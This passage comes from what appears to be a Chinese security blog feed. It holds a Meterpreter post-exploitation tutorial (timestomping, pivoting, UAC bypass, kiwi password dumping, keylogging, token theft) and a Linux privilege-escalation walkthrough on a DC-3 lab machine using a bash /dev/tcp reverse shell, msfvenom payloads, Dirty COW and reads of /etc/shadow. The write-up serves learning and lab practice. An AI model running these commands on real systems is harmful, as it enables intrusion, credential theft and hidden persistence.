class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getwd 或者<span class="built_in">pwd</span>                         <span class="comment"># 查看当前工作目录  </span></span><br><span class="line"><span class="built_in">ls</span>                                               <span class="comment"># 查看当前路径下的内容</span></span><br><span class="line"><span class="built_in">cd</span>                                              <span class="comment"># 切换目录</span></span><br><span class="line">search <span class="operator">-f</span> *host*                         <span class="comment"># 搜索文件  -h查看帮助</span></span><br><span class="line"><span class="built_in">cat</span> c:\\lltest\\lltestpasswd.txt    <span class="comment"># 查看文件内容</span></span><br><span class="line">edit c:\\<span class="number">1</span>.txt                               <span class="comment">#编辑或创建文件  没有的话，会新建文件</span></span><br><span class="line"><span class="built_in">rm</span> c:\\lltest\\hack.txt                <span class="comment">#删除文件</span></span><br><span class="line">mkdir lltest2                              <span class="comment">#只能在当前目录下创建文件夹</span></span><br><span class="line"><span class="built_in">rmdir</span> lltest2                               <span class="comment">#只能删除当前目录下文件夹</span></span><br></pre></td></tr></table></figure><h3 id="（2）上传文件"><a href="#（2）上传文件" class="headerlink" title="（2）上传文件"></a>（2）上传文件</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload //root//daociyiyou.txt c:</span><br><span class="line">[*] uploading  : //root/daociyiyou.txt -&gt; c:</span><br><span class="line">[*] uploaded   : //root/daociyiyou.txt -&gt; c:\daociyiyou.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; upload /tmp/<span class="number">1</span>.txt c:</span><br><span class="line"><span class="comment"># 注意：使用-r参数可以递归上传上传目录和文件</span></span><br></pre></td></tr></table></figure><h3 id="（3）下载文件"><a href="#（3）下载文件" class="headerlink" title="（3）下载文件"></a>（3）下载文件</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; download c:\\<span class="number">1</span>.txt /tmp/</span><br><span class="line">[*] Downloading: c:\hello.txt -&gt; /root/hello.txt</span><br><span class="line">[*] Downloaded <span class="number">1.00</span> B of <span class="number">1.00</span> B (<span class="number">100.0</span>%): c:\hello.txt -&gt; /root/hello.txt</span><br><span class="line">[*] download   : c:\hello.txt -&gt; /root/hello.txt</span><br></pre></td></tr></table></figure><h3 id="（4）Timestomp伪造时间戳"><a href="#（4）Timestomp伪造时间戳" class="headerlink" title="（4）Timestomp伪造时间戳"></a>（4）Timestomp伪造时间戳</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:\\ <span class="literal">-h</span>                            <span class="comment">#查看帮助</span></span><br><span class="line">timestomp <span class="literal">-v</span> C://<span class="number">2</span>.txt                      <span class="comment">#查看时间戳</span></span><br><span class="line">timestomp C://<span class="number">2</span>.txt <span class="operator">-f</span> C://<span class="number">1</span>.txt         <span class="comment">#将1.txt的时间戳复制给2.txt</span></span><br><span class="line"></span><br><span class="line">timestomp  C:\\<span class="number">1</span>.txt  <span class="operator">-f</span> C:\\Users\\Administrator\\Desktop\\test\\<span class="number">1</span>.jpg </span><br><span class="line"></span><br><span class="line">timestomp C:\\passwd.txt <span class="operator">-f</span> C:\\Users\\Administrator\\Desktop\\hj\\nginx<span class="literal">-0</span>.<span class="number">7.65</span>\\nginx.exe</span><br></pre></td></tr></table></figure><h2 id="3、网络命令"><a href="#3、网络命令" class="headerlink" title="3、网络命令"></a>3、网络命令</h2><h3 id="（1）基本网络命令"><a href="#（1）基本网络命令" class="headerlink" title="（1）基本网络命令"></a>（1）基本网络命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig     <span class="comment"># 查看ip</span></span><br><span class="line">netstat –an           <span class="comment"># 查看开放的端口</span></span><br><span class="line">arp                          <span class="comment"># arp探测</span></span><br><span class="line">getproxy                 <span class="comment">#查看代理信息</span></span><br><span class="line">route                       <span class="comment">#查看路由</span></span><br></pre></td></tr></table></figure><h3 id="（2）portfwd端口转发"><a href="#（2）portfwd端口转发" class="headerlink" title="（2）portfwd端口转发"></a>（2）portfwd端口转发</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add <span class="literal">-l</span> <span class="number">6666</span> <span class="literal">-p</span> <span class="number">3389</span> <span class="literal">-r</span> <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="comment">#将目标机的3389端口转发到本地6666端口</span></span><br></pre></td></tr></table></figure><h3 id="（3）autoroute添加路由"><a href="#（3）autoroute添加路由" class="headerlink" title="（3）autoroute添加路由"></a>（3）autoroute添加路由</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run autoroute <span class="literal">-h</span> <span class="comment">#查看帮助</span></span><br><span class="line">run autoroute <span class="literal">-s</span> <span class="number">192.168</span>.<span class="number">159.0</span>/<span class="number">24</span>  <span class="comment">#添加到目标环境网络，当你相连接一个网络发现不通的时候，可以设置一个路由试试，一般网络中没有设置围栏的情况下，是可以通的</span></span><br><span class="line"></span><br><span class="line">run autoroute <span class="literal">-p</span>  <span class="comment">#查看添加的路由</span></span><br></pre></td></tr></table></figure><h3 id="（4）Socks4a代理"><a href="#（4）Socks4a代理" class="headerlink" title="（4）Socks4a代理"></a>（4）Socks4a代理</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/server/socks4a </span><br><span class="line">msf &gt; <span class="built_in">set</span> srvhost <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">msf &gt; <span class="built_in">set</span> srvport <span class="number">1080</span></span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><p>然后<code>vim /etc/proxychains.conf</code> #添加 <code>socks4 127.0.0.1 1080</code>，这样你kali里面所有的软件运行，攻击的手段都</p><p>是走的肉鸡的代理，就做到了隐藏自己真是ip的效果了</p><p>最后proxychains 使用Socks4a代理访问<br>##4、提权<br>###（1）getsystem提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure><p>getsystem工作原理：</p><p>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。</p><p>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。</p><p>③Windows服务已启动，导致与命名管道建立连接。</p><p>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。</p><p>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<br>###（2）bypassuac<br>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">use exploit/windows/local/bypassuac_injection</span><br><span class="line">use windows/local/bypassuac_vbs</span><br><span class="line">use windows/local/ask</span><br></pre></td></tr></table></figure><p>如使用bypassuac.rb脚本：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf &gt; <span class="built_in">set</span> SESSION <span class="number">2</span></span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure><h3 id="（3）内核漏洞提权"><a href="#（3）内核漏洞提权" class="headerlink" title="（3）内核漏洞提权"></a>（3）内核漏洞提权</h3><p>可先利用enum_patches模块 收集补丁信息，然后查找可用的exploits进行提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  <span class="comment">#查看补丁信息</span></span><br><span class="line">msf &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf &gt; <span class="built_in">set</span> SESSION <span class="number">2</span></span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure><h2 id="5、kiwi获取密码"><a href="#5、kiwi获取密码" class="headerlink" title="5、kiwi获取密码"></a>5、kiwi获取密码</h2><p>在msf6中mimikatz已经不可以用了，The “mimikatz” extension has been replaced by “kiwi”</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load kiwi          <span class="comment"># help kiwi 查看帮助</span></span><br><span class="line">creds_wdigest  <span class="comment"># 获取账号密码</span></span><br></pre></td></tr></table></figure><h2 id="6、远程桌面-amp-截屏"><a href="#6、远程桌面-amp-截屏" class="headerlink" title="6、远程桌面&amp;截屏"></a>6、远程桌面&amp;截屏</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops     <span class="comment">#查看可用的桌面</span></span><br><span class="line">getdesktop          <span class="comment">#获取当前meterpreter 关联的桌面</span></span><br><span class="line">set_desktop         <span class="comment">#设置meterpreter关联的桌面  -h查看帮助</span></span><br><span class="line">screenshot           <span class="comment">#截屏</span></span><br><span class="line">use espia             <span class="comment">#或者使用espia模块截屏  然后输入screengrab</span></span><br><span class="line">run vnc                <span class="comment">#使用vnc远程桌面连接</span></span><br></pre></td></tr></table></figure><h2 id="7、开启RDP-amp-添加用户"><a href="#7、开启RDP-amp-添加用户" class="headerlink" title="7、开启RDP&amp;添加用户"></a>7、开启RDP&amp;添加用户</h2><h3 id="（1）getgui命令"><a href="#（1）getgui命令" class="headerlink" title="（1）getgui命令"></a>（1）getgui命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run getgui –<span class="built_in">h</span> <span class="comment">#查看帮助</span></span><br><span class="line">run getgui <span class="literal">-e</span> <span class="comment">#开启远程桌面</span></span><br><span class="line">run getgui <span class="literal">-u</span> test2 <span class="literal">-p</span> <span class="number">123456</span>.com   <span class="comment">#添加用户</span></span><br><span class="line">run getgui <span class="operator">-f</span> <span class="number">6661</span>   <span class="comment">#3389端口转发到6661</span></span><br></pre></td></tr></table></figure><p>getgui 系统不推荐，推荐使用<code>run post/windows/manage/enable_rdp</code></p><p>getgui添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆<br>###（2）enable_rdp脚本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp  <span class="comment">#开启远程桌面</span></span><br><span class="line"></span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=mhx PASSWORD=<span class="number">123456</span> <span class="comment">#添加用户,默认会添加到管理员组</span></span><br></pre></td></tr></table></figure><h2 id="8、键盘记录"><a href="#8、键盘记录" class="headerlink" title="8、键盘记录"></a>8、键盘记录</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start     <span class="comment">#开始键盘记录</span></span><br><span class="line">keyscan_dump   <span class="comment">#导出记录数据</span></span><br><span class="line">keyscan_stop     <span class="comment">#结束键盘记录</span></span><br></pre></td></tr></table></figure><h2 id="9、sniffer抓包"><a href="#9、sniffer抓包" class="headerlink" title="9、sniffer抓包"></a>9、sniffer抓包</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces       <span class="comment">#查看网卡</span></span><br><span class="line">sniffer_start <span class="number">2</span>            <span class="comment">#选择网卡 开始抓包</span></span><br><span class="line">sniffer_stats <span class="number">2</span>           <span class="comment">#查看状态</span></span><br><span class="line">sniffer_dump <span class="number">2</span> /tmp/lltest.pcap  <span class="comment">#导出pcap数据包</span></span><br><span class="line">sniffer_stop <span class="number">2</span>            <span class="comment">#停止抓包</span></span><br></pre></td></tr></table></figure><h2 id="10、令牌操纵"><a href="#10、令牌操纵" class="headerlink" title="10、令牌操纵"></a>10、令牌操纵</h2><p>这个非常有用，比如说我们在一个企业的域控环境里面，我本身是一个普通用户可以通过假冒令牌伪造成管理员用户，然后不需要密码就能登录其他账号了<br>###（1）incognito假冒令牌</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use incognito      <span class="comment">#help incognito  查看帮助</span></span><br><span class="line">list_tokens <span class="literal">-u</span>    <span class="comment">#查看可用的token</span></span><br><span class="line"></span><br><span class="line">impersonate_token <span class="string">&#x27;NT AUTHORITY\SYSTEM&#x27;</span>  <span class="comment">#假冒SYSTEM token</span></span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM <span class="comment">#不加单引号 需使用\\</span></span><br><span class="line"></span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   <span class="comment">#返回原始token</span></span><br></pre></td></tr></table></figure><h3 id="（2）steal-token窃取令牌"><a href="#（2）steal-token窃取令牌" class="headerlink" title="（2）steal_token窃取令牌"></a>（2）steal_token窃取令牌</h3><p>先查看进程后面的token值，然后找到管理员的token，然后再通过pid获取他的token</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steal_token &lt;pid值&gt;   <span class="comment">#从指定进程中窃取token   先ps</span></span><br><span class="line">drop_token  <span class="comment">#删除窃取的token</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 工具学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 工具学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权</title>
      <link href="/2022/05/01/linux_sudo/"/>
      <url>/2022/05/01/linux_sudo/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/d5b7ea3385fc488bb4ad9a896762eeda.png" alt="在这里插入图片描述"><br>本篇文章仅用于学习记录，不得用于其他违规用途。</p><h1 id="一、内核漏洞提权"><a href="#一、内核漏洞提权" class="headerlink" title="一、内核漏洞提权"></a>一、内核漏洞提权</h1><h2 id="1、常规查找"><a href="#1、常规查找" class="headerlink" title="1、常规查找"></a>1、常规查找</h2><p>查看内核版本信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname <span class="literal">-a</span></span><br><span class="line">uname <span class="literal">-r</span></span><br></pre></td></tr></table></figure><p>查看系统发行版本</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line"><span class="built_in">cat</span> /etc/*<span class="literal">-release</span></span><br><span class="line"></span><br><span class="line">Ubuntu <span class="number">16.04</span></span><br><span class="line"><span class="number">4.4</span>.<span class="number">0</span><span class="literal">-21-generic</span></span><br></pre></td></tr></table></figure><p>搜索该版本漏洞，把对应版本的文件上传到服务器编译执行</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu16.<span class="number">04</span></span><br><span class="line">searchsploit <span class="literal">-u</span> <span class="comment">#更新数据库</span></span><br></pre></td></tr></table></figure><h2 id="2、Ubuntu-16-04提权"><a href="#2、Ubuntu-16-04提权" class="headerlink" title="2、Ubuntu 16.04提权"></a>2、Ubuntu 16.04提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DC<span class="literal">-3</span> 靶机做实验 , 开局一个shell</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">0.189</span>/templates/beez3/error.php</span><br><span class="line">/bin/bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">192.168</span>.<span class="number">101.48</span>/<span class="number">5656</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> </span><br><span class="line">DC<span class="literal">-3</span>下载地址</span><br><span class="line">https://www.vulnhub.com/entry/dc<span class="literal">-32</span>,<span class="number">312</span>/</span><br><span class="line">后台</span><br><span class="line">http://<span class="number">192.168</span>.<span class="number">101.123</span>/administrator/</span><br><span class="line">admin snoopy</span><br></pre></td></tr></table></figure><p>发现是ubuntu16.04内核版本是4.4.0-21的，直接通过kali里面的漏洞库，搜索一下是否有exp</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Ubuntu <span class="number">16.04</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/b986212469bd49b587c54fd69322232b.png" alt="在这里插入图片描述"><br>这里我们使用33772.txt这个文件里的exp提权</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看文件内容</span><br><span class="line"><span class="built_in">cat</span> /usr/share/exploitdb/exploits/linux/local/<span class="number">39772</span>.txt</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/4deadf90c791468192e0ded216649b47.png" alt="在这里插入图片描述"><br>下载好后 , 通过python开启http服务 , 把压缩包下载到靶机上</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 <span class="literal">-m</span> http.servev <span class="number">8080</span> <span class="literal">--bind</span> <span class="number">192.168</span>.<span class="number">42.142</span> </span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">0.36</span>:<span class="number">8000</span>/<span class="number">39772</span>.zip</span><br></pre></td></tr></table></figure><p>接下来就是解压提权了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unzip <span class="number">39772</span>.zip <span class="built_in">cd</span> <span class="number">39772</span></span><br><span class="line">tar <span class="literal">-xvf</span> exploit.tar <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit <span class="built_in">ls</span></span><br><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br><span class="line">whoami</span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/6cf87a5d5c5940fbb97217f8b35bee42.png" alt="在这里插入图片描述"></p><h2 id="3、脏牛提权"><a href="#3、脏牛提权" class="headerlink" title="3、脏牛提权"></a>3、脏牛提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf靶机演示</span><br><span class="line">CVE<span class="literal">-2016-5195</span> </span><br><span class="line">Linux kernel &lt; <span class="number">4.8</span>.<span class="number">3</span> ( 使用msf靶机演示 )</span><br></pre></td></tr></table></figure><p>前提环境</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf上线</span><br><span class="line">msfvenom <span class="literal">-p</span> linux/x86/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">0.96</span> LPORT=<span class="number">8001</span> <span class="operator">-f</span> elf <span class="literal">-o</span> /tmp/shell.elf</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">python3 <span class="literal">-m</span> http.server</span><br><span class="line">msf监听</span><br><span class="line">msfconsole <span class="literal">-r</span> handler.rc</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp run <span class="literal">-j</span></span><br><span class="line">靶机上操作</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">6.73</span>:<span class="number">8000</span>/shell.elf chmod +x shell.elf</span><br><span class="line">nohup ./shell.elf &amp;</span><br><span class="line">msf上线</span><br><span class="line">getuid <span class="comment"># 查看权限 shell</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br></pre></td></tr></table></figure><p><strong>exp下载地址:<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a> , 将下载好的exp放到msf这台机器上</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过python切换成交互式shell</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> <span class="built_in">cat</span> /etc/shadow</span><br><span class="line">uname <span class="literal">-a</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">wget</span> http://<span class="number">192.168</span>.<span class="number">0.36</span>:<span class="number">8000</span>/dirtycow<span class="literal">-master</span>.zip unzip dirtycow<span class="literal">-master</span>.zip</span><br><span class="line"><span class="built_in">cd</span> dirtycow<span class="literal">-master</span></span><br><span class="line">gcc <span class="literal">-pthread</span> dirty.c <span class="literal">-o</span> dirty <span class="literal">-lcrypt</span></span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/0de0255cfb164c0bab69aa5efa0588da.png" alt="在这里插入图片描述"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su firefart <span class="number">123456</span></span><br><span class="line"><span class="built_in">cat</span> /etc/shadow</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/49434d5461fc44eb94d7a9702d3af1ef.png" alt="在这里插入图片描述"><br>实际上做的是备份+修改&#x2F;etc&#x2F;passwd文件 , 如果你想恢复的话执行以下命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure><h1 id="二、滥用sudo提权"><a href="#二、滥用sudo提权" class="headerlink" title="二、滥用sudo提权"></a>二、滥用sudo提权</h1><h2 id="1、什么是sudo"><a href="#1、什么是sudo" class="headerlink" title="1、什么是sudo"></a>1、什么是sudo</h2><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等，这样不仅减少了root用户的登录和管理时间，同样也提高了安全性，sudo不是对shell的一个代替，它是面向每个命令的基础。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">它的特性主要有这样几点: sudo能够限制用户只在某台主机上运行某些命令。</span><br><span class="line">sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务 器。</span><br><span class="line">sudo使用时间戳文件来执行类似的“检票”系统。当用户调用sudo并且输入它的密码时，用户获得了 一张存活期为<span class="number">5</span>分钟的票(这个值可以在编译的时候改变)。</span><br><span class="line">sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存 放的位置默认是在/etc/sudoers，属性必须为<span class="number">0440</span>。</span><br><span class="line">在sudo于<span class="number">1980</span>年前后被写出之前，一般用户管理系统的方式是利用su切换为超级用户。但是使用su的 缺点之一在于必须要先告知超级用户的密码。</span><br><span class="line">sudo使一般用户不需要知道超级用户的密码即可获得权限。首先超级用户将普通用户的名字、可以执 行的特定命令、按照哪种用户或用户组的身份执行等信息，登记在特殊的文件中(通常 是/etc/sudoers)，即完成对该用户的授权(此时该用户称为“sudoer ”);在一般用户需要取得特 殊权限时，其可在命令前加上“sudo”，此时sudo将会询问该用户自己的密码(以确认终端机前的是 该用户本人)，回答后系统即会将该命令的进程以超级用户的权限运行。之后的一段时间内(默认为<span class="number">5</span> 分钟，可在/etc/sudoers自定义)，使用sudo不需要再次输入密码。</span><br><span class="line">由于不需要超级用户的密码，部分Unix系统甚至利用sudo使一般用户取代超级用户作为管理帐号，例 如Ubuntu、Mac OS X等。</span><br></pre></td></tr></table></figure><p><strong>参数说明</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">-V</span> 显示版本编号</span><br><span class="line"><span class="literal">-h</span> 会显示版本编号及指令的使用方式说明</span><br><span class="line"><span class="literal">-l</span> 显示出自己(执行 sudo 的使用者)的权限</span><br><span class="line"><span class="literal">-v</span> 因为 sudo 在第一次执行时或是在 N 分钟内没有执行(N 预设为五)会问密码，这个参数是重新做 一次确认，如果超过 N 分钟，也会问密码</span><br><span class="line"><span class="literal">-k</span> 将会强迫使用者在下一次执行 sudo 时问密码(不论有没有超过 N 分钟)</span><br><span class="line"><span class="literal">-b</span> 将要执行的指令放在背景执行</span><br><span class="line"><span class="literal">-p</span> prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %<span class="built_in">h</span> 会显示主机名称</span><br><span class="line"><span class="literal">-u</span> username/<span class="comment">#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令(#uid 为该 username 的使用者号码)</span></span><br><span class="line"><span class="literal">-s</span> 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell</span><br><span class="line"><span class="literal">-H</span> 将环境变数中的 HOME (家目录)指定为要变更身份的使用者家目录(如不加 <span class="literal">-u</span> 参数就是系统管 理者 root )</span><br><span class="line">command 要以系统管理者身份(或以 <span class="literal">-u</span> 更改为其他人)执行的指令</span><br></pre></td></tr></table></figure><h2 id="2、sudoer文件语法"><a href="#2、sudoer文件语法" class="headerlink" title="2、sudoer文件语法"></a>2、sudoer文件语法</h2><p>sudoers文件主要有三部分组成</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudoers的默认配置(default)，主要设置sudo的一些缺省值 alias(别名)，主要有Host_Alias|Runas_Alias|User_Alias|Cmnd_Alias。 安全策略(规则定义)——重点。</span><br><span class="line">语法</span><br><span class="line">root ALL=(ALL) ALL</span><br><span class="line">说明<span class="number">1</span>:root用户可以从 ALL终端作为 ALL(任意)用户执行，并运行 ALL(任意)命令。 第一部分是用户，第二部分是用户可以在其中使用sudo命令的终端，第三部分是他可以充当的用户， 最后一部分是他在使用时可以运行的命令。sudo</span><br><span class="line">touhid ALL= /sbin/poweroff 说明<span class="number">2</span>:以上命令，使用户可以从任何终端使用touhid的用户密码关闭命令电源。</span><br><span class="line">touhid ALL = (root) NOPASSWD:/usr/bin/find 说明<span class="number">3</span>:上面的命令，使用户可以从任何终端运行，以root用户身份运行命令find 而无需密码。</span><br></pre></td></tr></table></figure><p><strong>设置某个用户执行某个命令sudo免密码</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 